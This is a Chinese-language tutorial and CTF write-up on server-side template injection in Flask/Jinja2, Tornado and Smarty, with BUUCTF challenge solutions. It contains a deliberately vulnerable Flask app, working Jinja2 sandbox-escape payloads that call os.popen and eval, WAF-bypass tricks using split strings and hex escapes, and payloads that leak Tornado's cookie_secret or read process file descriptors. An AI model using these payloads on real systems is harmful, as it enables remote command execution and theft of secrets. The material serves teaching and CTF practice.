---
typora-copy-images-to: upload

---

# SSTI-服务端模版注入漏洞

小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。

#### 原理：

```shell
# 服务端接受用户的输入，将其作为web应用模版的一部分
# 在进行目标编译渲染的过程中，执行了用户的恶意输入，因而导致了敏感信息泄露，代码执行，Getshell等问题。

# 其影响范围主要取决于模版引擎的复杂性。
```

#### 模版引擎：

在传统的网站，客户端向服务器发送请求，服务器将数据和html字符串发送给客户端 

如果使用AJAX技发送请求，那么服务器端就会返回json数据，原本数据和html的拼接是在服务器端完成的，现在在客户端完成，那么就需要使用客户端模版引擎

**概念**：

​		模板引擎不属于特定技术领域，它是跨领域跨平台的概念。在[Asp](https://baike.baidu.com/item/Asp)下有模板引擎，在[PHP](https://baike.baidu.com/item/PHP)下也有模板引擎，在[C#](https://baike.baidu.com/item/C%23)下也有，甚至[JavaScript](https://baike.baidu.com/item/JavaScript)、[WinForm](https://baike.baidu.com/item/WinForm)开发都会用到模板引擎技术

**用途**：

​		模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的[HTML](https://baike.baidu.com/item/HTML/97049)文档。

​		我们司空见惯的模板安装卸载等概念，基本上都和模板引擎有着千丝万缕的联系。模板引擎不只是可以让你实现代码分离（业务逻辑代码和用户界面代码），也可以实现数据分离（动态数据与静态数据），还可以实现代码单元共享（代码重用），甚至是多语言、[动态页面](https://baike.baidu.com/item/动态页面)与[静态页面](https://baike.baidu.com/item/静态页面)自动均衡（SDE）等等与用户界面可能没有关系的功能。![img](https://img2020.cnblogs.com/blog/1630201/202006/1630201-20200625203433754-1237925548.png)

​		**通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将塞进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。**

#### 什么是模版注入:

当不正确的使用模版引擎进行渲染时，则会造成模版注入，such as：

```PYTHON
from flask import Flask
from flask import request
from flask import config
from flask import render_template_string
app = Flask(__name__)

app.config['SECRET_KEY'] = "flag{SSTI_123456}"
@app.route('/')                 # route装饰器路由
def hello_world():
    return 'Hello World!'

@app.errorhandler(404)
def page_not_found(e):
    template = '''
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div> 
{%% endblock %%}
''' % (request.args.get('404_url'))
    return render_template_string(template), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
```

 **@app.route('/')** 使用route装饰器是告诉Flask什么样的URL能触发我们的函数.route()装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如

```python
@app.route("/login")
def login():
    
    return "hello Flask"
```

**这个时候再访问0.0.0.0：5000/login会输出hello Flask。**

**main入口**

当.py文件直接运行时，if __name__ == '__main__':之下的代码开始运行，当py文件是一模块的形式被导入的时候 if __name__ == '__main__':之下的代码快不会被运行

```python
app.run(host='0.0.0.0',debug=True)
```

**模版渲染：**

我们模版渲染的话有两个方法，render_template() 和 render_template_string()

Render_template():用来渲染一个指定的额template文件夹下的一个文件

render_template_string:用来渲染一个字符串

 ```shell
return render_template_string(template), 404 # 这里指渲染了字符串
 ```



* 网上大部分所使用的request.url的方式已经不能导致模板注入了，在最新的flask版本中会自动对request.url进行urlencode，所以我稍微改了一下代码，改成request.args传参就可以了。

在上述代码中，直接将用户可控参数`request.args.get('404_url')`在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。

![image-20210427183828255](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5jwd8oj30z109rmyx.jpg)		

详细请参考：https://xz.aliyun.com/t/3679

#### 沙盒以及沙盒逃逸

> **沙盒/沙箱**

沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。

沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。而我们这里主要讲解的是python环境下的沙箱逃逸。

> **内建函数**

**概念：**

​		当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。

​		内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。

**名称空间**

名称空间在python是个非常重要的概念，它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间

```
    内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字

    全局名称空间：在执行文件时，存放文件级别定义的名字

    局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内		定义的名字，该名字在函数调用时生效，调用结束后失效

```

**在python中，初始的builtins模块提供内建名称空间到内建对象的映射**

dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些

![image-20210428185626920](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4ssoimj30er01paa6.jpg)

这里面，我们可以看到`__builtins__`是做为默认初始模块出现的，那么用dir()命令看看`__builtins__`的成分。

![image-20210428192429857](https://tva1.sinaimg.cn/large/008i3skNly1gq0s537w12j30fu0abgp9.jpg)



在这个里面，我们会看到很多熟悉的关键字。比如：`__import__`、`str`、`len`等。看到这里大家会不会突然想明白为什么python解释器里能够直接使用某些函数了？比如直接使用len()函数

![image-20210428193100977](https://tva1.sinaimg.cn/large/008i3skNly1gq0s57n807j308r01cgln.jpg)

**类继承**

python中对一个变量应用**class**方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法

```python
__base__ //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法

__mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到

__subclasses__() //继承此对象的子类，返回一个列表
```

**魔术函数**

这里介绍几个常见的魔术函数，有助于后续的理解

- `__dict__`类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里的对象的__dict__中存储了一些self.xxx的一些东西内置的数据类型没有__dict__属性每个类有自己的__dict__属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__对象也有自己的__dict__属性， 存储self.xxx 信息，父子类对象公用__dict__

- `__globals__`该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用**globals**属性访问全局的变量。该属性保存的是函数全局变量的**字典**引用。

- `__getattribute__()`实例、类、函数都具有的`__getattribute__`魔术方法。事实上，在实例化的对象进行`.`操作的时候（形如：`a.xxx/a.xxx()`），都会自动去调用`__getattribute__`方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

* `__subclasses__()`返回子类列表，
* `__bases__`列出基类



使用方法:

从变量->对象->基类->子类遍历->全局变量 这个流程中，找到我们想要的模块或者函数。



利用方式：

- 查配置文件
- 命令执行（其实就是沙盒逃逸类题目的利用方式）

### 查配置文件

什么是查配置文件？我们都知道一个python框架，比如说flask，在框架中内置了一些全局变量，对象，函数等等。我们可以直接访问或是调用。这里拿两个例题来简单举例：

**easy_tornado**

这个题目发现模板注入后的一个关键考点在于`handler.settings`。这个是Tornado框架本身提供给程序员可快速访问的配置文件对象之一。分析[官方文档](https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax)可以发现handler.settings其实指向的是RequestHandler.application.settings，即可以获取当前application.settings，从中获取到敏感信息。

**shrine**

这个题目直接给出了源码，flag被写入了配置文件中

```
app.config['FLAG'] = os.environ.pop('FLAG')
```

同样在此题的Flask框架中，我们可以通过内置的config对象直接访问该应用的配置信息。不过此题设置了WAF，并不能直接访问`{{config}}`得到配置文件而是需要进行一些绕过。这个题目很有意思，开拓思路，有兴趣可以去做一下。

总结一下这类题目，为了内省框架，我们应该：

> 查阅相关框架的文档
>
> 使用`dir`内省`locals`对象来查看所有能够使用的模板上下文
>
> 使用dir深入内省所有对象
>
> 直接分析框架源码



### 命令执行

命令执行，其实就是前面我们介绍的沙盒溢出的操作。在python环境下，由于在SSTI发生时，以Jinja2为例，在渲染的时候会把`{{}}`包裹的内容当做变量解析替换，在`{{}}`包裹中我们插入`''.__class__.__mro__[-1].__subclasses__()[40]`类似的payload也能够被先解析而后结果字符串替换成模板中的具体内容。

浅谈__getattribute__和getattr:https://blog.csdn.net/qq_41359051/article/details/82930939

## flask实战

* **一些魔术方法**:

```python
1 __class__ 返回类型所属的对象
2 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
3 __base__ 返回该对象所继承的基类
4 // __base__和__mro__都是用来寻找基类的
5 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
6 __init__类的初始化方法
7 __globals__对包含函数全局变量的字典的引用
```

* **语法**

```ABAP
1 {%...%}:    用于语句
2 {{…}}:    用于表达式，对其进行解析，并打印到模板输出
3 {{#...#}}:    用于注释
```

**flask模版的基本用法：**

https://www.cnblogs.com/xiaxiaoxu/p/10428508.html

**漏洞利用：**

原题复现

```python
 from flask import Flask
 from flask import render_template
 from flask import render_template_string
 from flask import request
 app=Flask(__name__)
 
 @app.route("/login")
 def login():
     username=request.args.get("name")
     html='''
     <h1> this is login page %s</h1>
     '''%(username)
     return render_template_string(html) 
 if __name__=="__main__":
     app.run(debug=True)
```



根据路由，访问/login并且传递参数?name={{1*2}}

![image-20210428100410451](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4vhgmbj30l904oq3f.jpg)

发现返回的值时2，即对我们的输入进行了运算

那么这时候就存在ssti注入

python沙盒逃逸https://blog.csdn.net/qq_42181428/article/details/99355219

传参{{config}}查看配置文件

![image-20210428100711800](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5v36mtj312l0hp47b.jpg)

利用方法

传参数{{"".\__class__}}获取字符串的类对象

```
name={{"".__class__}}
```



![image-20210428100933426](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4riz62j30hm04xmxs.jpg)

寻找基类

```python
http://127.0.0.1:5000/login?name={{"".__class__.__mro__}}
```



![image-20210428101029449](https://tva1.sinaimg.cn/large/008i3skNly1gq0s3ni5bzj30n6039aam.jpg)

查看哪些类被进行了调用

```python
http://127.0.0.1:5000/login?name={{"".__class__.__mro__[1].__subclasses__()}}
```

![image-20210428101925790](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5qvluzj313l0k9qei.jpg)

找到os类相关的类

![image-20210428111429770](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4zofbvj30td05pt9j.jpg)

数字时才出来的，先猜100，找找位置，在往后，几次就猜出来了

查找到这样的子类，而这个字类又继承了os类

这个时候我们便可以利用.**init**.**globals**来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。

![image-20210428115928954](https://tva1.sinaimg.cn/large/008i3skNly1gq0s6csjzcj31300ezgva.jpg)



构造payload

```python
{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
```

![image-20210428120114807](https://tva1.sinaimg.cn/large/008i3skNly1gq0s6fd2x8j30wj03lwf0.jpg)

很显然命令被执行

参考博客：https://blog.csdn.net/zz_Caleb/article/details/96480967



## ctf中的一些绕过tips

没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。

1.过滤[]等括号

使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}

绕过后{{"".**class**.**bases**.**getitem**(0)}}

2.过滤了subclasses，拼凑法

原poc{{"".**class**.**bases**[0].**subclasses**()}}

绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}

3.过滤class

使用session

poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session['__cla'+'ss__'].__mro__[12]}}
```

或者

```
request['__cl'+'ass__'].__mro__[12]}}
```

4.timeit姿势

可以学习一下  2017 swpu-ctf的一道沙盒python题，

这里不详说了，博大精深，我只意会一二。

```
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)

import platform
print platform.popen('dir').read()
```

5.收藏的一些poc

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}
```

BUUCTF进行练习：

## [护网杯 2018]easy_tornado

![image-20210427194143812](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4yc2cuj30ho02swek.jpg)

![image-20210428160507340](https://tva1.sinaimg.cn/large/008i3skNly1gq0s6fqhe7j30jq01dmxc.jpg)

![image-20210427202357053](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5vqdbtj30ix04b0sy.jpg)



![image-20210427202408659](https://tva1.sinaimg.cn/large/008i3skNly1gq0s505dcnj30gc02r74d.jpg)

![image-20210427202419815](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4wkirgj30ct0210st.jpg)

查询cookie_secret:https://tornado-zh.readthedocs.io/zh/latest/guide/security.html

直接访问/fllllllllllllag失败。

百度了render可知，render是python的一个模块，他们的url都是由filename和filehash组成，filehash即为他和filename的md5值。



当filename或filehash不匹配时，将会跳转到http://fe01b382-7935-4e50-8973-f09a31b53c8f.node1.buuoj.cn/error?msg=Error  页面.

![image-20210428160708406](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4w27y4j30qw03ut9b.jpg)

所以想到需要获取cookie_secret来得到filehash

那么，怎么获取cookie

<a href="https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler.get_secure_cookie">cookie_secret</a>

![image-20210428160917455](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4xoahbj30l20d940u.jpg)

查询tornado cookie

![image-20210428162319429](https://tva1.sinaimg.cn/large/008i3skNly1gq0s51b6dij30gf03qmxl.jpg)

settiings:传递给构造函数的其他关键字参数保存在settings字典中，并且在文档中通常称为“应用程序设置”。设置用于自定义tornado的各个方面（尽管在某些情况下，可以通过覆盖的子类中的方法来进行更丰富的自定义RequestHandler）。一些应用程序还喜欢使用settings字典作为使特定于应用程序的设置可供处理程序使用的方式，而无需使用全局变量。在tornado中使用的设置如下所述。

而RequestHandler.settings是self.application.settings的别称，也就是**RequestHandler.settings=RequestHandler.application.settings**，self取RequestHandler。
也就是说**RequestHandler.settings=RequestHandler.application.settings**
而handler指向RequestHandler，所以handler就指向RequestHandler.application，最后handlers.ettings=RequestHandler.application.settings
最后捋一下

```python
hanlder=RequestHandler
hanlder.settings=RequestHandler.settings
RequestHandler.settings=RequestHandler.application.settings
RequestHandler.application.settings可以调用cookie_secrethanlder.settings=RequestHandler.application.settings
hanlder.settings可以调用cookie_secret
```

原文链接：https://blog.csdn.net/weixin_45253573/article/details/109623436

构造payload

```url
http://71b049e4-2a5f-4cea-a666-759c79785d23.node3.buuoj.cn/error?msg={{handler.settings}}
```

![image-20210428172125120](https://tva1.sinaimg.cn/large/008i3skNly1gq0s6er5rvj3130098myt.jpg)

对文件名加密处理

![image-20210428172305117](https://tva1.sinaimg.cn/large/008i3skNly1gq0s6dycuxj30mc0d177a.jpg)



加密处理

![image-20210428172159290](https://tva1.sinaimg.cn/large/008i3skNly1gq0s57fgapj30q30atmzs.jpg)

构建payload

```
http://71b049e4-2a5f-4cea-a666-759c79785d23.node3.buuoj.cn/file?filename=%2ffllllllllllllag&filehash=b78fdb227df9272aed37a89d3b610c67
```

得到flag

![image-20210428172011391](https://tva1.sinaimg.cn/large/008i3skNly1gq0s58kpauj30xn0fqdht.jpg)



## [BJDCTF2020]The mystery of ip

1. 进入flag.php

![image-20210429122809136](https://tva1.sinaimg.cn/large/008i3skNly1gq0s60tqfxj30pr0cmwhl.jpg)

2. hint.php

![image-20210429122951771](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5ziffbj312y0btgo7.jpg)

显示出来ip，那么就看一下xff字段

![image-20210429123859602](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5kqplyj30z90bi40l.jpg)

很显然随着xff改变，页面回显也发生变化

尝试ssti注入

{{7*7}}

![image-20210429124149309](https://tva1.sinaimg.cn/large/008i3skNly1gq0s54ynh4j30sn0d3mza.jpg)

查看配置文件

![image-20210429124329519](https://tva1.sinaimg.cn/large/008i3skNly1gq0s3ri05dj30xv0j9wj3.jpg)

根据报错发现这里是Smarty的模版引擎



查看`Smarty3`官方手册：https://www.smarty.net/docs/zh_CN/language.function.if.tpl

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210418184005662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70)

查看版本信息



![image-20210429124606248](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5jx2iwj30z109rmyx.jpg)



利用{if}语句执行php代码

![image-20210429124708740](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5xzmo3j31240jo445.jpg)

查询flag

![image-20210429124858171](https://tva1.sinaimg.cn/large/008i3skNly1gq0s55xg49j30ul0brtan.jpg)



## [pasecactf_2019]flask_ssti

题目已经显示是ssti就直接进行一下模板注入

### ![image-20210429125023122](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4um51vj30jd064wey.jpg)



查看配置文件

![image-20210429125136320](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4txbc9j30fl0ix77d.jpg)

可能存在过滤

![image-20210429130454507](https://tva1.sinaimg.cn/large/008i3skNly1gq0s61edbyj30gf077dg7.jpg)

那么转换成16进制

```python
code = "/proc/self/fd/1"
ssti = ""
length = len(code)
for i in range(length):
    ssti += "\\x" + hex(ord(code[i]))[2:]
print(ssti)
```

查处基类包含的所有字类

![image-20210429131523378](https://tva1.sinaimg.cn/large/008i3skNly1gq0s5lznfqj30un0bkmz9.jpg)

```
<class '_frozen_importlib_external.FileLoader'>
```

构造payload

```
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
```



![image-20210429132030587](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4s3285j30m208i74u.jpg)



**flag{fde38292-447d-4518-8242-86df7f047333}**
